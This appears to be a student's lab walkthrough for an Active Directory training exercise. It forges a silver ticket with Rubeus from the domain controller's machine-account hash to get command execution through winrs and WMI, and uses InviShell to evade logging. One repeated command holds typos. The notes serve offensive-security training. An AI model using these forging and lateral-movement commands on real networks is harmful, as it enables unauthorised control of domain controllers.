
Task 

• During the additional lab time, try to get command execution on the domain controller by creating silver ticket for: 
− HTTP service 
− WMI

From the information gathered in previous steps we have the hash for machine account of the domain controller (us-dc$). Using the below command from an elevated shell, we can create a Silver Ticket that provides us access to the HTTP service of DC.

Please note that the hash of us-dc$ (RC4 in the below command) may be different in the lab. You can also use aes256 keys in place of NTLM hash:

```
echo %Pwn% silver
```

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args %Pwn% /service:host/us-dc.us.techcorp.local /rc4:f4492105cb24a843356945e45402073e /ldap /sid:S-1-5-21-210670787-2521448726-163245708 /user:Administrator /domain:us.techcorp.local /ptt
```

![[Pasted image 20250319012941.png]]

```
winrs -r:us-dc.us.techcorp.local cmd
```

![[Pasted image 20250319013011.png]]

```
C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args%Pwn% /service:host/us-dc.us.techcorp.local /rc4:f4492105cb24a843356945e45402073e /ldap /sid:S-1-5-21-210670787- 2521448726-163245708 /user:Administrator /domain:us.techcorp.local /ptt
```


![[Pasted image 20250319013227.png]]

```
klist
```

![[Pasted image 20250319013328.png]]
Now, try running WMI commands on the domain controller:

```
C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
```

```
Get-WmiObject -Class win32_operatingsystem -ComputerName us-dc.us.techcorp.local
```

![[Pasted image 20250319013416.png]]






